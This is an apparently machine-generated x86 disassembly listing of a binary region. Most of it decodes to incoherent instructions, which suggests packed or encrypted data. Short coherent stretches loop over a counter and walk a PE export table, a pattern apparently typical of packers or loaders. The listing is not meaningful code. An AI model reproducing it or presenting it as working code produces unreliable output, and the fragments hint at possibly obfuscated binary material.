  40adb1:	sub    BYTE PTR [ebp+0x5aff2cc8],ch
  40adb7:	rcr    bh,1
  40adb9:	clc    
  40adba:	dec    edi
  40adbb:	mov    dh,0xb2
  40adbd:	dec    eax
  40adbe:	out    0xf2,al
  40adc0:	arpl   sp,cx
  40adc2:	or     esp,DWORD PTR [edi]
  40adc4:	mov    eax,0x835e96d0
  40adc9:	xor    BYTE PTR [edi+0x7d7e9482],0x51
  40add0:	adc    BYTE PTR ds:0x55cc280f,bl
  40add6:	daa    
  40add7:	aam    0x9a
  40add9:	mov    dh,0x7c
  40addb:	cmp    ch,bh
  40addd:	scas   al,BYTE PTR es:[edi]
  40adde:	call   0x4e02:0x415327c1
  40ade5:	xor    DWORD PTR [eax+0x2c],0xffffffc8
  40ade9:	xchg   dh,ah
  40adeb:	loopne 0x40addc
  40aded:	push   esi
  40adee:	or     al,0x89
  40adf0:	or     BYTE PTR ds:0x6472e68,dh
  40adf6:	or     DWORD PTR [esi-0x638c836f],edx
  40adfc:	mov    WORD PTR [eax-0xb],cs
  40adff:	cmp    DWORD PTR [eax+0x5bf69cda],edx
  40ae05:	jo     0x40ae51
  40ae07:	aaa    
  40ae08:	mov    al,0x31
  40ae0a:	fcmovnu st,st(4)
  40ae0c:	xlat   BYTE PTR ds:[ebx]
  40ae0d:	rcl    DWORD PTR [ebp-0x12],0xcd
  40ae11:	pop    edx
  40ae12:	push   edi
  40ae13:	lea    edi,[eax-0x57]
  40ae16:	pop    es
  40ae17:	inc    ch
  40ae19:	xor    BYTE PTR [eax],dh
  40ae1b:	cmp    DWORD PTR [ebx+0x4fec477f],ecx
  40ae21:	pop    edi
  40ae22:	push   ecx
  40ae23:	push   0x5f
  40ae25:	ret    0x2816
  40ae28:	in     eax,0xb6
  40ae2a:	gs inc ecx
  40ae2c:	add    al,0x19
  40ae2e:	dec    ebx
  40ae2f:	inc    edi
  40ae30:	pop    ss
  40ae31:	adc    BYTE PTR [edi-0x21],0x60
  40ae35:	xor    eax,0x41a7439d
  40ae3a:	jae    0x40ade5
  40ae3c:	dec    edi
  40ae3d:	cmp    esi,DWORD PTR ds:[edi+0x65]
  40ae41:	fld    QWORD PTR [ecx-0x6a]
  40ae44:	idiv   dl
  40ae46:	dec    esp
  40ae47:	dec    edx
  40ae48:	dec    esi
  40ae49:	call   0xcd5b:0xa5bc615d
  40ae50:	cmp    DWORD PTR [eax-0x70],0x235714ed
  40ae57:	sub    dh,BYTE PTR [esi-0x34]
  40ae5a:	xlat   BYTE PTR ds:[ebx]
  40ae5b:	adc    eax,0x7f8b77d
  40ae60:	sbb    al,0xd5
  40ae62:	fimul  WORD PTR [esi]
  40ae64:	inc    ebp
  40ae65:	mov    ebx,0xfde7ef0e
  40ae6a:	cmp    DWORD PTR cs:[eax+0x20],ebp
  40ae6e:	sub    esi,DWORD PTR [esi-0x7bc09bef]
  40ae74:	cmp    al,BYTE PTR [ebx-0x4281dc86]
  40ae7a:	fiadd  DWORD PTR [ebp+ebx*1-0x6e]
  40ae7e:	(bad)
  40ae81:	cmp    al,0x31
  40ae83:	retf   0x9ad0
  40ae86:	shl    DWORD PTR [eax+eax*1],0x2e
  40ae8a:	jge    0x40ae13
  40ae8c:	cmp    edx,DWORD PTR [ebx]
  40ae8e:	aad    0xac
  40ae90:	push   ds
  40ae91:	push   ecx
  40ae92:	mov    bl,0xb2
  40ae94:	(bad)
  40ae97:	das    
  40ae98:	sub    al,0xde
  40ae9a:	ins    DWORD PTR es:[edi],dx
  40ae9b:	(bad)  
  40ae9c:	adc    DWORD PTR [ebx+0x525156f4],ebp
  40aea2:	iret   
  40aea3:	into   
  40aea4:	cmp    BYTE PTR [esi+0x73],0xed
  40aea8:	sbb    cx,bx
  40aeab:	xor    BYTE PTR [edi-0x721fb02c],bl
  40aeb1:	inc    edx
  40aeb2:	cmp    al,0xb1
  40aeb4:	arpl   WORD PTR [edx],di
  40aeb6:	jns    0x40af1a
  40aeb8:	and    BYTE PTR [ecx+0x4f92bfce],bl
  40aebe:	(bad)  
  40aebf:	in     al,dx
  40aec0:	pop    ebp
  40aec1:	imul   DWORD PTR [eax+0x11]
  40aec4:	xchg   edi,eax
  40aec5:	xchg   edi,eax
  40aec6:	mov    edx,edx
  40aec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec9:	std    
  40aeca:	test   DWORD PTR [ebx],ebp
  40aecc:	test   al,0xa1
  40aece:	push   edi
  40aecf:	fnstcw WORD PTR [ebp-0x583008e6]
  40aed5:	iret   
  40aed6:	dec    edi
  40aed7:	xchg   ebp,eax
  40aed8:	jmp    0xf341:0x180ef4db
  40aedf:	push   esi
  40aee0:	jl     0x40af0e
  40aee2:	ss cmp al,0x95
  40aee5:	jbe    0x40af44
  40aee7:	mov    ah,0xe3
  40aee9:	sub    esi,esp
  40aeeb:	lds    ecx,FWORD PTR [ebp-0x2]
  40aeee:	xchg   esp,eax
  40aeef:	mov    cs,WORD PTR [esi+edi*8]
  40aef2:	in     eax,0x38
  40aef4:	cmp    al,0x3c
  40aef6:	dec    esi
  40aef7:	dec    esp
  40aef8:	mov    bl,0xd7
  40aefa:	sbb    eax,0xaec7c067
  40aeff:	and    al,BYTE PTR [esi]
  40af01:	fstp   QWORD PTR [esi]
  40af03:	loope  0x40af31
  40af05:	xlat   BYTE PTR ds:[ebx]
  40af06:	sbb    al,ah
  40af08:	mov    eax,0xf9d3471d
  40af0d:	sbb    ebp,eax
  40af0f:	aad    0xaa
  40af11:	mov    al,ds:0x4ad2937e
  40af16:	jbe    0x40aeb4
  40af18:	xchg   BYTE PTR [ebx+0x7e],ch
  40af1b:	adc    al,0x13
  40af1d:	sub    al,0x99
  40af1f:	mov    al,ds:0x53113877
  40af24:	sub    ebp,DWORD PTR [ebx+edi*8]
  40af27:	mov    ds,eax
  40af29:	and    eax,0x42aabc64
  40af2e:	popa   
  40af2f:	pop    edx
  40af30:	mov    ebx,0x1f1221ca
  40af35:	fild   QWORD PTR [edi-0x40f350ca]
  40af3b:	imul   ebp,DWORD PTR [edi],0xffffffa9
  40af3e:	sahf   
  40af3f:	sahf   
  40af40:	adc    ebp,esi
  40af42:	xchg   edi,eax
  40af43:	mov    al,0xca
  40af45:	dec    ecx
  40af46:	shl    DWORD PTR [ecx-0x38],1
  40af49:	jbe    0x40aefa
  40af4b:	jbe    0x40af42
  40af4d:	fsubrp st(1),st
  40af4f:	sub    al,0x7c
  40af51:	pop    ecx
  40af52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af53:	iret   
  40af54:	push   cs
  40af55:	mov    al,al
  40af57:	cli    
  40af58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af59:	ror    BYTE PTR [edi+ecx*8-0x48d68378],1
  40af60:	push   cs
  40af61:	sub    bh,bl
  40af63:	call   0xd151:0xeafa5db3
  40af6a:	xchg   DWORD PTR [edx-0x29],edi
  40af6d:	push   es
  40af6e:	cmp    ebx,DWORD PTR [edx-0x3c]
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	rcl    BYTE PTR [esi+ebp*4+0x56],0x64
  40b01c:	idiv   DWORD PTR [esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	jo     0x40b07c
  40b025:	(bad)  
  40b026:	js     0x40b026
  40b028:	push   edi
  40b029:	cdq    
  40b02a:	stc    
  40b02b:	inc    eax
  40b02c:	mov    eax,0xb79c9de6
  40b031:	and    cl,BYTE PTR [eax-0x3c]
  40b034:	leave  
  40b035:	enter  0xbb8b,0x6c
  40b039:	(bad)  
  40b03a:	jp     0x40b07a
  40b03c:	sub    eax,0x4c0b2d13
  40b041:	mov    eax,ds:0xcac00bb9
  40b046:	loop   0x40b08c
  40b048:	in     eax,0x74
  40b04a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b04b:	outs   dx,DWORD PTR ds:[esi]
  40b04c:	cmp    al,BYTE PTR [eax-0x4a]
  40b04f:	add    DWORD PTR [ebp-0x58],ebp
  40b052:	sub    eax,0x9e311a0f
  40b057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b058:	sar    DWORD PTR [eax+0x49e96e06],0xac
  40b05f:	xor    BYTE PTR [ebp+esi*1+0x1aa6d3],ch
  40b066:	pop    edi
  40b067:	mov    ax,0x980f
  40b06b:	pop    eax
  40b06c:	hlt    
  40b06d:	xchg   BYTE PTR [eax+0x47],cl
  40b070:	cld    
  40b071:	fldenv [ecx+0x6a]
  40b074:	outs   dx,BYTE PTR ds:[esi]
  40b075:	stos   DWORD PTR es:[edi],eax
  40b076:	dec    esp
  40b077:	xchg   esi,eax
  40b078:	ss dec edx
  40b07a:	sbb    DWORD PTR [ebx+eax*4],ecx
  40b07d:	xchg   edx,eax
  40b07e:	jbe    0x40b08d
  40b080:	rol    DWORD PTR [ebp*4-0x699b8c99],1
  40b087:	mov    eax,ds:0x19f587e3
  40b08c:	inc    ebx
  40b08d:	sti    
  40b08e:	xchg   edi,eax
  40b08f:	mov    dl,0x47
  40b091:	xor    eax,0xd5c71080
  40b096:	or     al,0xd8
  40b098:	out    0xa,al
  40b09a:	sub    al,0xf8
  40b09c:	sbb    bl,BYTE PTR [ecx+edi*4+0x21]
  40b0a0:	xchg   ebp,eax
  40b0a1:	popa   
  40b0a2:	shl    DWORD PTR [edx+0xf],cl
  40b0a5:	outs   dx,DWORD PTR ds:[esi]
  40b0a6:	lods   al,BYTE PTR ss:[esi]
  40b0a8:	dec    ebp
  40b0a9:	dec    ebp
  40b0aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0ab:	adc    DWORD PTR [edi-0x236deb9d],edi
  40b0b1:	shl    DWORD PTR [ebp+0xc4a56c1],0x80
  40b0b8:	adc    eax,ebx
  40b0ba:	sub    eax,0x4f82f73b
  40b0bf:	inc    esi
  40b0c0:	adc    al,BYTE PTR [edx]
  40b0c2:	mov    edi,0xcaac1fb
  40b0c7:	sbb    eax,0x32fac90
  40b0cc:	(bad)  
  40b0cd:	fist   WORD PTR [ebx]
  40b0cf:	push   0x728d5e61
  40b0d4:	not    ebp
  40b0d6:	sbb    al,ch
  40b0d8:	pop    esp
  40b0d9:	push   cs
  40b0da:	mov    bh,0xc8
  40b0dc:	mov    bh,0x8a
  40b0de:	repz adc dl,BYTE PTR [ebp-0x4b640009]
  40b0e5:	or     bh,BYTE PTR [ecx+0x242c8e48]
  40b0eb:	lods   al,BYTE PTR ds:[esi]
  40b0ec:	push   ecx
  40b0ed:	mov    esp,0x3312726a
  40b0f2:	xor    DWORD PTR [esi+0x29f7b6c2],esp
  40b0f8:	push   ds
  40b0f9:	sub    DWORD PTR [edx+0x4607f1dd],ebp
  40b0ff:	cli    
  40b100:	aam    0x1e
  40b102:	xchg   edx,eax
  40b103:	adc    cl,BYTE PTR [ebx+0x25]
  40b106:	jo     0x40b0ca
  40b108:	mov    esp,esi
  40b10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b10b:	sub    ebp,esp
  40b10d:	imul   edi,DWORD PTR [edx-0x78a7baa],0xc718c8ba
  40b117:	xor    eax,0x7f29e62e
  40b11c:	scas   eax,DWORD PTR es:[edi]
  40b11d:	rcl    BYTE PTR [esi-0x74],cl
  40b120:	scas   eax,DWORD PTR es:[edi]
  40b121:	xchg   ecx,eax
  40b122:	pop    ebx
  40b123:	ja     0x40b0d5
  40b125:	jl     0x40b12e
  40b127:	mov    edx,0x6058d5ad
  40b12c:	(bad)  
  40b12d:	das    
  40b12e:	dec    ecx
  40b12f:	sbb    dh,BYTE PTR [ebx+0x32378f93]
  40b135:	add    esp,DWORD PTR [esi]
  40b137:	mov    ds:0xb5bbac91,al
  40b13c:	or     dh,BYTE PTR [eax+0x1f6aa6f0]
  40b142:	xchg   DWORD PTR [edi-0x66ab8114],edi
  40b148:	call   0x52c2:0xd15bdb8e
  40b14f:	call   0xaf2c:0x6ad79cea
  40b156:	nop
  40b157:	or     dl,BYTE PTR [ecx+eax*1-0x24a69df7]
  40b15e:	imul   esi,DWORD PTR [esi],0x8bedee4d
  40b164:	leave  
  40b165:	(bad)  
  40b166:	push   ss
  40b167:	sub    BYTE PTR ds:0xc35fb24c,0xd
  40b16e:	leave  
  40b16f:	or     cl,bl
  40b171:	add    cl,ah
  40b173:	nop
  40b174:	inc    esi
  40b175:	xchg   edx,eax
  40b176:	leave  
  40b177:	inc    ecx
  40b178:	arpl   WORD PTR [ecx+0x27],cx
  40b17b:	(bad)  
  40b17c:	xor    BYTE PTR [ecx+0x30],cl
  40b17f:	inc    BYTE PTR [ebx]
  40b181:	in     eax,dx
  40b182:	jnp    0x40b13b
  40b184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b185:	leave  
  40b186:	ret    0xb7d8
  40b189:	into   
  40b18a:	mov    ds:0x2def3663,eax
  40b18f:	lds    ebp,FWORD PTR [esi-0x779a2543]
  40b195:	mov    edx,0xb5724611
  40b19a:	ret    0x59ed
  40b19d:	lods   al,BYTE PTR ds:[esi]
  40b19e:	pop    esp
  40b19f:	stos   DWORD PTR es:[edi],eax
  40b1a0:	mov    edi,0x839c6ae
  40b1a5:	sbb    eax,0xc7ae4a66
  40b1aa:	or     DWORD PTR ds:0x8b5ed950,ecx
  40b1b0:	add    eax,0x946a6f1c
  40b1b5:	add    ecx,DWORD PTR [ecx+0x3658ec9e]
  40b1bb:	pushf  
  40b1bc:	test   DWORD PTR [ecx],0x1e707d8c
  40b1c2:	jae    0x40b1a7
  40b1c4:	sub    ah,dl
  40b1c6:	add    eax,0x26dac822
  40b1cb:	repnz adc edx,ecx
  40b1ce:	or     ax,0x55b9
  40b1d2:	leave  
  40b1d3:	cs clc 
  40b1d5:	ins    BYTE PTR es:[edi],dx
  40b1d6:	ins    BYTE PTR es:[edi],dx
  40b1d7:	aam    0x46
  40b1d9:	nop
  40b1da:	jbe    0x40b23e
  40b1dc:	cli    
  40b1dd:	loop   0x40b1f0
  40b1df:	mov    ebx,0xceca3663
  40b1e4:	jge    0x40b220
  40b1e6:	(bad)  [ebp+ebp*4+0x7e3a2cf]
  40b1ed:	aam    0x32
  40b1ef:	adc    eax,0x86ba4170
  40b1f4:	nop
  40b1f5:	jmp    0x40b1a3
  40b1f7:	or     esi,DWORD PTR [ecx-0x36]
  40b1fa:	fidivr DWORD PTR [eax-0x74b240a4]
  40b200:	mov    DWORD PTR [eax],eax
  40b202:	jle    0x40b1c6
  40b204:	mov    cs,WORD PTR ds:0x7d663179
  40b20a:	pop    ebx
  40b20b:	sub    cl,bl
  40b20d:	out    dx,al
  40b20e:	jnp    0x40b194
  40b210:	inc    BYTE PTR [ebx-0x480a754c]
  40b216:	lods   al,BYTE PTR ds:[esi]
  40b217:	rcl    dh,1
  40b219:	mov    edi,0x87a7110d
  40b21e:	(bad)  [ecx]
  40b220:	and    al,BYTE PTR [edx-0x71fe907c]
  40b226:	pop    ds
  40b227:	xchg   ebx,eax
  40b228:	dec    BYTE PTR [esi+0x2e6abacc]
  40b22e:	fdiv   st(7),st
  40b230:	pop    esi
  40b231:	js     0x40b279
  40b233:	call   0x38e5:0xa6d1c514
  40b23a:	xchg   ebp,eax
  40b23b:	loopne 0x40b1e0
  40b23d:	lahf   
  40b23e:	inc    edi
  40b23f:	out    dx,al
  40b240:	out    0xe4,al
  40b242:	mov    dh,dl
  40b244:	adc    DWORD PTR [edi+0x27],0x5e558383
  40b24b:	push   esp
  40b24c:	sbb    DWORD PTR [ecx-0x55],eax
  40b24f:	sub    BYTE PTR [eax+ecx*2-0x56ab444b],ch
  40b256:	jge    0x40b277
  40b258:	stc    
  40b259:	popa   
  40b25a:	test   BYTE PTR [ebx],0xad
  40b25d:	pop    ebp
  40b25e:	sahf   
  40b25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b260:	push   ebx
  40b261:	daa    
  40b262:	aad    0xb6
  40b264:	dec    edi
  40b265:	pop    esi
  40b266:	fisttp WORD PTR [eax*2-0x7413ba75]
  40b26d:	dec    ebp
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	inc    edi
  40b284:	(bad)
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	pop    eax
  40b290:	popa   
  40b291:	(bad)  [edx+0x51ac3a8a]
  40b297:	jae    0x40b270
  40b299:	cwde   
  40b29a:	mov    bl,0x25
  40b29c:	or     ah,ah
  40b29e:	lea    edi,[esi]
  40b2a0:	cmp    DWORD PTR [ebx+0x7cea36ef],edi
  40b2a6:	lods   eax,DWORD PTR ds:[esi]
  40b2a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2a8:	mov    DWORD PTR [ebx],eax
  40b2aa:	sbb    eax,ebp
  40b2ac:	leave  
  40b2ad:	mov    eax,0x86647bb0
  40b2b2:	sti    
  40b2b3:	xlat   BYTE PTR ds:[ebx]
  40b2b4:	hlt    
  40b2b5:	sbb    al,0x88
  40b2b7:	into   
  40b2b8:	clc    
  40b2b9:	cs aas 
  40b2bb:	in     al,0x5
  40b2bd:	pop    ebp
  40b2be:	xor    edx,DWORD PTR [edx+0x3d742b4a]
  40b2c4:	mov    WORD PTR [ebx],?
  40b2c6:	inc    edi
  40b2c7:	ins    BYTE PTR es:[edi],dx
  40b2c8:	jle    0x40b265
  40b2ca:	lock xchg ebx,eax
  40b2cc:	sar    BYTE PTR [esi-0x5424eb8d],cl
  40b2d2:	hlt    
  40b2d3:	pop    esi
  40b2d4:	dec    ecx
  40b2d5:	fnsave [eax-0x30]
  40b2d8:	dec    edi
  40b2d9:	jle    0x40b319
  40b2db:	jg     0x40b302
  40b2dd:	test   DWORD PTR [ecx+0x171ba06a],esi
  40b2e3:	pop    ebp
  40b2e4:	std    
  40b2e5:	test   al,0x43
  40b2e7:	cmp    eax,0xed6abe3b
  40b2ec:	cmp    ah,BYTE PTR [edx+0x1f84ddf8]
  40b2f2:	cld    
  40b2f3:	mov    BYTE PTR [edi+edi*2-0xf],ch
  40b2f7:	retf   
  40b2f8:	dec    edx
  40b2f9:	cmp    edi,DWORD PTR [edx-0x21]
  40b2fc:	jp     0x40b353
  40b2fe:	mov    bh,BYTE PTR [esi+ebp*2]
  40b301:	jle    0x40b376
  40b303:	jns    0x40b373
  40b305:	loopne 0x40b297
  40b307:	in     eax,dx
  40b308:	cmp    eax,0x1d83ba2f
  40b30d:	pop    edx
  40b30e:	push   esi
  40b30f:	rol    BYTE PTR [ecx+ebp*2],0x6b
  40b313:	sbb    DWORD PTR [edi],ebx
  40b315:	mov    ebx,0xee6537fd
  40b31a:	or     BYTE PTR [edx-0xf23e509],ch
  40b320:	clc    
  40b321:	pop    edx
  40b322:	rol    dl,1
  40b324:	(bad)  
  40b325:	adc    al,0x9f
  40b327:	mov    ecx,0x993c6573
  40b32c:	adc    eax,0x92de534
  40b331:	bound  ecx,QWORD PTR [ebp+0x6c]
  40b334:	inc    edx
  40b335:	cmp    BYTE PTR [eax+0x19],bl
  40b338:	(bad)  
  40b339:	push   ebx
  40b33a:	push   ebx
  40b33b:	in     eax,dx
  40b33c:	hlt    
  40b33d:	jno    0x40b3b4
  40b33f:	or     ah,ch
  40b341:	xlat   BYTE PTR ds:[ebx]
  40b342:	xor    eax,0xdf408ecf
  40b347:	or     eax,0xec209cb9
  40b34c:	add    eax,DWORD PTR [ebp+edi*4+0x5d]
  40b350:	cmp    eax,0xf73a9c6c
  40b355:	dec    eax
  40b356:	fsub   QWORD PTR [edx+0x11ceead4]
  40b35c:	fisttp QWORD PTR [ecx+0x11]
  40b35f:	in     al,0xb5
  40b361:	pushf  
  40b362:	xchg   edx,eax
  40b363:	aas    
  40b364:	arpl   bx,di
  40b366:	fidivr WORD PTR [eax-0x7d]
  40b369:	pop    ecx
  40b36a:	dec    ebx
  40b36b:	dec    esi
  40b36c:	call   0x9b5:0xc9504689
  40b373:	int    0x4
  40b375:	push   eax
  40b376:	loop   0x40b3a1
  40b378:	mov    al,ds:0x45b1c7ce
  40b37d:	mov    eax,ds:0xc3650c3e
  40b382:	bound  eax,QWORD PTR [edx+0x64]
  40b385:	xchg   ebp,eax
  40b386:	(bad)  
  40b387:	icebp  
  40b388:	and    edx,DWORD PTR [edx+0x37]
  40b38b:	pop    ebx
  40b38c:	xchg   edx,eax
  40b38d:	pop    ss
  40b38e:	add    al,0x63
  40b390:	cmp    eax,0xfc56075c
  40b395:	fidiv  DWORD PTR [ebx-0x54b7975a]
  40b39b:	inc    esi
  40b39c:	es or  esi,edx
  40b39f:	test   eax,0x2de35947
  40b3a4:	cdq    
  40b3a5:	sub    eax,0xcdb99d2b
  40b3aa:	inc    ebx
  40b3ab:	xor    al,0x6b
  40b3ad:	or     eax,0x22630f09
  40b3b2:	shr    BYTE PTR [edi+0x6e112312],1
  40b3b8:	xlat   BYTE PTR ds:[ebx]
  40b3b9:	push   ecx
  40b3ba:	jns    0x40b3ec
  40b3bc:	mov    fs,WORD PTR [ecx+0x69478d3e]
  40b3c2:	mov    ds:0x45eaacd1,eax
  40b3c7:	xchg   ebp,eax
  40b3c8:	push   ebp
  40b3c9:	and    eax,0x108f0dbd
  40b3ce:	inc    esp
  40b3cf:	or     eax,DWORD PTR [ecx]
  40b3d1:	xor    bh,BYTE PTR [ebp-0x74]
  40b3d4:	or     ch,BYTE PTR [edi-0x4c]
  40b3d7:	shl    BYTE PTR [eax+0x54bff7fe],1
  40b3dd:	mov    cl,0xf8
  40b3df:	in     eax,0x2e
  40b3e1:	inc    eax
  40b3e2:	(bad)  
  40b3e3:	cmp    ah,BYTE PTR [esi+0x8394bef]
  40b3e9:	ins    BYTE PTR es:[edi],dx
  40b3ea:	in     al,0x2c
  40b3ec:	cmp    BYTE PTR [edx+0x1013f6fe],bl
  40b3f2:	xor    cl,dh
  40b3f4:	(bad)  
  40b3f5:	pop    esi
  40b3f6:	cmp    al,0x60
  40b3f8:	xchg   esp,eax
  40b3f9:	in     eax,dx
  40b3fa:	addr16 jle 0x40b3ab
  40b3fd:	bound  ebx,QWORD PTR [esi-0x369e435f]
  40b403:	sahf   
  40b404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b405:	aas    
  40b406:	shl    DWORD PTR [edx],cl
  40b408:	popa   
  40b409:	jg     0x40b402
  40b40b:	mov    cs,WORD PTR [esi-0x3]
  40b40e:	ds dec esi
  40b410:	retf   
  40b411:	es out 0xaf,al
  40b414:	call   FWORD PTR [ebx]
  40b416:	ficomp WORD PTR [eax]
  40b418:	fimul  WORD PTR [ebx+0x79]
  40b41b:	idiv   DWORD PTR [esi]
  40b41d:	inc    ebx
  40b41e:	fadd   QWORD PTR [ecx-0x31]
  40b421:	fmul   DWORD PTR [eax]
  40b423:	dec    esi
  40b424:	(bad)  
  40b425:	mov    dl,0xb2
  40b427:	outs   dx,DWORD PTR ds:[esi]
  40b428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b429:	fistp  QWORD PTR [eax+0x224ba46]
  40b42f:	dec    ebx
  40b430:	es mov ah,0x6a
  40b433:	out    0xf8,al
  40b435:	out    0xe4,al
  40b437:	or     ah,BYTE PTR [esp+ecx*2]
  40b43a:	sub    ebp,DWORD PTR [eax+0x288b1b8d]
  40b440:	or     bh,al
  40b442:	mov    dh,0x9
  40b444:	adc    bl,BYTE PTR [ecx-0x15381d40]
  40b44a:	loop   0x40b3ee
  40b44c:	xor    esi,esp
  40b44e:	add    eax,0x18445e7a
  40b453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b454:	adc    ebx,DWORD PTR [esi-0x2ccd6f87]
  40b45a:	pop    ss
  40b45b:	mov    esp,0xbfdbf417
  40b460:	pushf  
  40b461:	mov    ecx,0x36cdad45
  40b466:	imul   eax,DWORD PTR [eax-0x75045f7b],0xffffffbc
  40b46d:	ficomp DWORD PTR [edi]
  40b46f:	sbb    BYTE PTR [eax+edi*2+0x1afe22e3],0xf0
  40b477:	loop   0x40b410
  40b479:	push   es
  40b47a:	xor    DWORD PTR [edi-0x20],edi
  40b47d:	in     eax,0x1f
  40b47f:	sub    eax,0x3781a14b
  40b484:	call   0x23e9:0x5bacfe9f
  40b48b:	xchg   ebx,eax
  40b48c:	mov    ?,edi
  40b48e:	cmp    DWORD PTR [edi+0x2a],ebx
  40b491:	test   BYTE PTR [ebp-0x4dfe7b14],0x72
  40b498:	std    
  40b499:	sbb    cl,dl
  40b49b:	scas   al,BYTE PTR es:[edi]
  40b49c:	jecxz  0x40b434
  40b49e:	pop    edx
  40b49f:	cmp    esp,edi
  40b4a1:	in     eax,dx
  40b4a2:	push   ecx
  40b4a3:	pop    es
  40b4a4:	pop    esi
  40b4a5:	(bad)  
  40b4a6:	std    
  40b4a7:	jl     0x40b4d2
  40b4a9:	scas   al,BYTE PTR es:[edi]
  40b4aa:	jo     0x40b4bc
  40b4ac:	in     al,dx
  40b4ad:	xchg   ebx,eax
  40b4ae:	lea    ebp,ds:0x24ac6666
  40b4b4:	mov    ds:0xc3a9ea11,al
  40b4b9:	jns    0x40b46e
  40b4bb:	ror    cl,cl
  40b4bd:	jns    0x40b4ed
  40b4bf:	ficomp DWORD PTR [edi]
  40b4c1:	push   eax
  40b4c2:	shl    BYTE PTR [ebp+0x6a],1
  40b4c5:	pop    ss
  40b4c6:	add    bh,BYTE PTR [ebx]
  40b4c8:	sahf   
  40b4c9:	cmp    ah,ch
  40b4cb:	dec    DWORD PTR [ebx-0x4f]
  40b4ce:	cs out 0x3a,al
  40b4d1:	mov    eax,ds:0x890f1ec6
  40b4d6:	dec    ebp
  40b4d7:	aam    0x8b
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	inc    ebx
  40b508:	jecxz  0x40b4f2
  40b50a:	inc    esi
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b536
  40b514:	in     al,0x3a
  40b516:	and    ah,BYTE PTR [ebp-0x3d4d583d]
  40b51c:	sbb    BYTE PTR [eax+0x5f42d5d2],0xe8
  40b523:	push   es
  40b524:	in     eax,dx
  40b525:	ins    DWORD PTR es:[edi],dx
  40b526:	shr    DWORD PTR [esi],cl
  40b528:	ds jno 0x40b4bd
  40b52b:	jne    0x40b548
  40b52d:	dec    ebp
  40b52e:	jge    0x40b4ce
  40b530:	aaa    
  40b531:	or     BYTE PTR [ebx+0x23],dl
  40b534:	(bad)  
  40b535:	loope  0x40b53c
  40b537:	out    0xcc,eax
  40b539:	rcl    al,cl
  40b53b:	xor    BYTE PTR [edi],dh
  40b53d:	xchg   edi,eax
  40b53e:	(bad)  
  40b53f:	test   al,0x29
  40b541:	mov    al,0x80
  40b543:	les    ebx,FWORD PTR [edi]
  40b545:	adc    al,0x82
  40b547:	pop    eax
  40b548:	inc    esi
  40b549:	gs gs sti 
  40b54c:	imul   esi,DWORD PTR [edi+0x69511527],0xe774650b
  40b556:	mov    ch,0xd6
  40b558:	mov    ?,esp
  40b55a:	repz sbb ah,BYTE PTR [esi+0x76b13ae5]
  40b561:	sti    
